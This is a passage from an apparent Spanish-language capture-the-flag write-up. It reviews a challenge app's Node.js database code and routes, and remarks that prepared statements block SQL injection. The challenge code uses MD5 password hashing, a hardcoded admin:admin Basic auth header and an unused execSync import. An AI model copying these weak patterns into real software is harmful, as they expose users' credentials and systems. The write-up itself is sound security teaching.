<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9">this</span><span class="mtk1">.db.</span><span class="mtk8">exec</span><span class="mtk1">(</span><span class="mtk4">`</span>
<span class="mtk4">            DROP TABLE IF EXISTS users;</span>

<span class="mtk4">            CREATE TABLE IF NOT EXISTS users (</span>
<span class="mtk4">                id         INTEGER NOT NULL PRIMAR</span><span class="mtk4">Y KEY AUTOINCREMENT,</span>
<span class="mtk4">                username   VARCHAR(255) NOT NULL U</span><span class="mtk4">NIQUE,</span>
<span class="mtk4">                password   VARCHAR(255) NOT NULL,</span>
<span class="mtk4">                verified   BOOLEAN      NOT NULL D</span><span class="mtk4">EFAULT false</span>
<span class="mtk4">            );</span>

<span class="mtk4">            INSERT INTO users (username, password,</span><span class="mtk4"> verified) VALUES ('admin', '</span><span class="mtk5">${</span><span class="mtk1">password</span><span class="mtk5">}</span><span class="mtk4">', true);</span>

<span class="mtk4">            DROP TABLE IF EXISTS enrollments;</span>

<span class="mtk4">            CREATE TABLE IF NOT EXISTS enrollments</span><span class="mtk4"> (</span>
<span class="mtk4">                id         INTEGER NOT NULL PRIMAR</span><span class="mtk4">Y KEY AUTOINCREMENT,</span>
<span class="mtk4">                username   VARCHAR(255) NOT NULL U</span><span class="mtk4">NIQUE,</span>
<span class="mtk4">                full_name VARCHAR(255) NULL,</span>
<span class="mtk4">                phone   VARCHAR(255) NULL,</span>
<span class="mtk4">                birth_date   VARCHAR(255) NULL,</span>
<span class="mtk4">                gender   VARCHAR(255) NULL,</span>
<span class="mtk4">                biography   TEXT NULL,</span>
<span class="mtk4">                resume_file VARCHAR(256) NULL</span>
<span class="mtk4">            );</span>

<span class="mtk4">            DROP TABLE IF EXISTS settings;</span>

<span class="mtk4">            CREATE TABLE settings(</span>
<span class="mtk4">                id             INTEGER NOT NULL PR</span><span class="mtk4">IMARY KEY AUTOINCREMENT,</span>
<span class="mtk4">                config_key          VARCHAR(2) NOT</span><span class="mtk4"> NULL,</span>
<span class="mtk4">                config_val          NUMERIC(9,6) N</span><span class="mtk4">OT NULL</span>
<span class="mtk4">            );</span>
<span class="mtk4">            INSERT INTO settings (config_key, conf</span><span class="mtk4">ig_val)</span>
<span class="mtk4">            VALUES</span>
<span class="mtk4">                ('sms_verb', 'POST'),</span>
<span class="mtk4">                ('sms_url', '</span><span class="mtk4 detected-link">https://platform.clickatell.com/messages</span><span class="mtk4">'),</span>
<span class="mtk4">                ('sms_params', '{"apiKey" : "xxxx"</span><span class="mtk4">, "toNumber": "recipient", "text": "message"}'),</span>
<span class="mtk4">                ('sms_headers', 'Content-Type: app</span><span class="mtk4">lication/json</span><span class="mtk6">\n</span><span class="mtk4">Authorization: Basic YWRtaW46YWRtaW4='),</span>
<span class="mtk4">                ('sms_resp_ok', '&lt;status&gt;ok&lt;/statu</span><span class="mtk4">s&gt;'),</span>
<span class="mtk4">                ('sms_resp_bad', '&lt;status&gt;error&lt;/s</span><span class="mtk4">tatus&gt;');</span>
<span class="mtk4">        `</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">registerUser</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">, </span><span class="mtk9 mtki">password</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">register_sql</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk9">this</span><span class="mtk1">.db.</span><span class="mtk8">prepare</span><span class="mtk1">(</span><span class="mtk4">'INSERT INTO users (username, password) VALUES ( ?</span><span class="mtk4">, ?)'</span><span class="mtk1">);</span>
<span class="mtk1">                </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">enrollment_sql</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk9">this</span><span class="mtk1">.db.</span><span class="mtk8">prepare</span><span class="mtk1">(</span><span class="mtk4">'INSERT INTO enrollments (username) VALUES (?)'</span><span class="mtk1">);</span>

<span class="mtk1">                </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">register_sql</span><span class="mtk1">.</span><span class="mtk8">run</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">, </span><span class="mtk8">md5</span><span class="mtk1">(</span><span class="mtk9 mtki">password</span><span class="mtk1">));</span>
<span class="mtk1">                </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">enrollment_sql</span><span class="mtk1">.</span><span class="mtk8">run</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">);</span>

<span class="mtk1">                </span><span class="mtk8">resolve</span><span class="mtk1">();</span>
<span class="mtk1">            } </span><span class="mtk5">catch</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">                </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">);</span>
<span class="mtk1">            }</span>
<span class="mtk1">        });</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">loginUser</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">, </span><span class="mtk9 mtki">password</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk9">this</span><span class="mtk1">.db.</span><span class="mtk8">prepare</span><span class="mtk1">(</span><span class="mtk4">'SELECT username FROM users WHERE username = ? and</span><span class="mtk4"> password = ?'</span><span class="mtk1">);</span>  
<span class="mtk1">                </span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">, </span><span class="mtk8">md5</span><span class="mtk1">(</span><span class="mtk9 mtki">password</span><span class="mtk1">)));</span>
<span class="mtk1">            } </span><span class="mtk5">catch</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">                </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">);</span>
<span class="mtk1">            }</span>
<span class="mtk1">        });</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">getUser</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk9">this</span><span class="mtk1">.db.</span><span class="mtk8">prepare</span><span class="mtk1">(</span><span class="mtk4">'SELECT * FROM users WHERE username = ?'</span><span class="mtk1">);</span>
<span class="mtk1">                </span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">));</span>
<span class="mtk1">            } </span><span class="mtk5">catch</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">                </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">);</span>
<span class="mtk1">            }</span>
<span class="mtk1">        });</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">checkUser</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk9">this</span><span class="mtk1">.db.</span><span class="mtk8">prepare</span><span class="mtk1">(</span><span class="mtk4">'SELECT username FROM users WHERE username = ?'</span><span class="mtk1">);</span>
<span class="mtk1">                </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">row</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">);</span>
<span class="mtk1">                </span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk1">row</span><span class="mtk1"> </span><span class="mtk5">!==</span><span class="mtk1"> </span><span class="mtk6">undefined</span><span class="mtk1">);</span>
<span class="mtk1">            } </span><span class="mtk5">catch</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">                </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">);</span>
<span class="mtk1">            }</span>
<span class="mtk1">        });</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">getFormData</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk9">this</span><span class="mtk1">.db.</span><span class="mtk8">prepare</span><span class="mtk1">(</span><span class="mtk4">'SELECT * FROM enrollments WHERE username = ?'</span><span class="mtk1">);</span>
<span class="mtk1">                </span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">));</span>
<span class="mtk1">            } </span><span class="mtk5">catch</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">                </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">);</span>
<span class="mtk1">            }</span>
<span class="mtk1">        });</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">updateEnrollment</span><span class="mtk1">(</span><span class="mtk9 mtki">full_name</span><span class="mtk1">, </span><span class="mtk9 mtki">phone</span><span class="mtk1">, </span><span class="mtk9 mtki">birth_date</span><span class="mtk1">, </span><span class="mtk9 mtki">gender</span><span class="mtk1">, </span><span class="mtk9 mtki">biography</span><span class="mtk1">, </span><span class="mtk9 mtki">username</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk9">this</span><span class="mtk1">.db.</span><span class="mtk8">prepare</span><span class="mtk1">(</span><span class="mtk4">`</span>
<span class="mtk4">                    UPDATE enrollments</span>
<span class="mtk4">                    SET</span>
<span class="mtk4">                        full_name = ?,</span>
<span class="mtk4">                        phone = ?,</span>
<span class="mtk4">                        birth_date = ?,</span>
<span class="mtk4">                        gender = ?,</span>
<span class="mtk4">                        biography = ?</span>
<span class="mtk4">                    WHERE username = ?</span>
<span class="mtk4">                `</span><span class="mtk1">);</span>
<span class="mtk1">                </span><span class="mtk8">resolve</span><span class="mtk1">((</span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1">.</span><span class="mtk8">run</span><span class="mtk1">(</span><span class="mtk9 mtki">full_name</span><span class="mtk1">, </span><span class="mtk9 mtki">phone</span><span class="mtk1">, </span><span class="mtk9 mtki">birth_date</span><span class="mtk1">, </span><span class="mtk9 mtki">gender</span><span class="mtk1">, </span><span class="mtk9 mtki">biography</span><span class="mtk1">, </span><span class="mtk9 mtki">username</span><span class="mtk1">)));</span>
<span class="mtk1">            } </span><span class="mtk5">catch</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">                </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">);</span>
<span class="mtk1">            }</span>
<span class="mtk1">        });</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">setResume</span><span class="mtk1">(</span><span class="mtk9 mtki">filename</span><span class="mtk1">, </span><span class="mtk9 mtki">username</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk9">this</span><span class="mtk1">.db.</span><span class="mtk8">prepare</span><span class="mtk1">(</span><span class="mtk4">'UPDATE enrollments SET resume_file = ? WHERE user</span><span class="mtk4">name = ?'</span><span class="mtk1">);</span>
<span class="mtk1">                </span><span class="mtk8">resolve</span><span class="mtk1">((</span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1">.</span><span class="mtk8">run</span><span class="mtk1">(</span><span class="mtk9 mtki">filename</span><span class="mtk1">, </span><span class="mtk9 mtki">username</span><span class="mtk1">)));</span>
<span class="mtk1">            } </span><span class="mtk5">catch</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">                </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">);</span>
<span class="mtk1">            }</span>
<span class="mtk1">        });</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">saveSMSConfig</span><span class="mtk1">(</span><span class="mtk9 mtki">verb</span><span class="mtk1">, </span><span class="mtk9 mtki">url</span><span class="mtk1">, </span><span class="mtk9 mtki">params</span><span class="mtk1">, </span><span class="mtk9 mtki">headers</span><span class="mtk1">, </span><span class="mtk9 mtki">resp_ok</span><span class="mtk1">, </span><span class="mtk9 mtki">resp_bad</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">smsConfig</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk4">'sms_verb'</span><span class="mtk1">: </span><span class="mtk9 mtki">verb</span><span class="mtk1">,</span>
<span class="mtk1">                </span><span class="mtk4">'sms_url'</span><span class="mtk1">: </span><span class="mtk9 mtki">url</span><span class="mtk1">,</span>
<span class="mtk1">                </span><span class="mtk4">'sms_params'</span><span class="mtk1">: </span><span class="mtk9 mtki">params</span><span class="mtk1">,</span>
<span class="mtk1">                </span><span class="mtk4">'sms_headers'</span><span class="mtk1">: </span><span class="mtk9 mtki">headers</span><span class="mtk1">,</span>
<span class="mtk1">                </span><span class="mtk4">'sms_resp_ok'</span><span class="mtk1">: </span><span class="mtk9 mtki">resp_ok</span><span class="mtk1">,</span>
<span class="mtk1">                </span><span class="mtk4">'sms_resp_bad'</span><span class="mtk1">: </span><span class="mtk9 mtki">resp_bad</span>
<span class="mtk1">            }</span>
<span class="mtk1">            </span><span class="mtk5">for</span><span class="mtk1">(</span><span class="mtk7 mtki">const</span><span class="mtk1"> [</span><span class="mtk1">col_name</span><span class="mtk1">, </span><span class="mtk1">col_data</span><span class="mtk1">] </span><span class="mtk5">of</span><span class="mtk1"> </span><span class="mtk7 mtki">Object</span><span class="mtk1">.</span><span class="mtk8">entries</span><span class="mtk1">(</span><span class="mtk1">smsConfig</span><span class="mtk1">)) {</span>
<span class="mtk1">                </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">                    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk9">this</span><span class="mtk1">.db.</span><span class="mtk8">prepare</span><span class="mtk1">(</span><span class="mtk4">'UPDATE settings SET config_val = ? WHERE config_k</span><span class="mtk4">ey = ?'</span><span class="mtk1">);</span>
<span class="mtk1">                    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1">.</span><span class="mtk8">run</span><span class="mtk1">(</span><span class="mtk1">col_data</span><span class="mtk1">, </span><span class="mtk1">col_name</span><span class="mtk1">)</span>
<span class="mtk1">                } </span><span class="mtk5">catch</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">                    </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">);</span>
<span class="mtk1">                }</span>
<span class="mtk1">            }</span>
<span class="mtk1">            </span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">);</span>
<span class="mtk1">        });</span>
<span class="mtk1">    }</span>

<span class="mtk1">}</span>
</code></pre></div><p>Todo parece correcto ya que las consultas est谩n utilizando sentencias preparadas (<em>prepared statements</em>), por lo que la inyecci贸n SQL no es posible.</p><p>Adem谩s, la contrase帽a para <code>admin</code> es aleatoria se usa MD5 para crear un <em>hash</em> .Entonces, incluso si descargamos el archivo <code>admin.db</code> y extraemos el <em>hash</em>, no podremos descifrarlo porque la contrase帽a es aleatoria.</p><h3 id="rutas-disponibles">Rutas disponibles</h3><p>Hay un mont贸n de <em>endpoints</em> configurados en <code>routes/index.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">read_file</span> /app/routes/index.js  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span><span class="mtk1"> path </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">'path'</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk6">*</span><span class="mtk1"> </span><span class="mtk5">as</span><span class="mtk1"> fs </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">'fs'</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> axios </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">'axios'</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> { Router } </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">'express'</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> { sign } </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">'../helpers/JWTHelper.js'</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> { AuthMiddleware } </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">'../middleware/AuthMiddleware.js'</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> { AdminMiddleware } </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">'../middleware/AdminMiddleware.js'</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> { LocalMiddleware } </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">'../middleware/LocalMiddleware.js'</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> { execSync } </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">'child_process'</span><span class="mtk1">;</span>

<span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">;</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">router</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">Router</span><span class="mtk1">();</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">response</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">data</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> ({ </span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk9 mtki">data</span><span class="mtk1"> });</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'index.html'</span><span class="mtk1">);</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/register'</span><span class="mtk1">, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'register.html'</span><span class="mtk1">);</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/login'</span><span class="mtk1">, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'login.html'</span><span class="mtk1">);</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">'/api/register'</span><span class="mtk1">, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">username</span><span class="mtk1">, </span><span class="mtk1">password</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.body;</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">username</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">password</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">getUser</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1">)</span>
<span class="mtk1">            .</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk9 mtki">user</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">user</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">401</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'This username is already registered!'</span><span class="mtk1">));</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">registerUser</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1">, </span><span class="mtk1">password</span><span class="mtk1">)</span>
<span class="mtk1">                    .</span><span class="mtk8">then</span><span class="mtk1">(()  </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'Account registered successfully!'</span><span class="mtk1">)))</span>
<span class="mtk1">            })</span>
<span class="mtk1">            .</span><span class="mtk8">catch</span><span class="mtk1">(() </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'Something went wrong!'</span><span class="mtk1">)));</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">401</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk4">'Please fill out all the required fields!'</span><span class="mtk1">));</span>
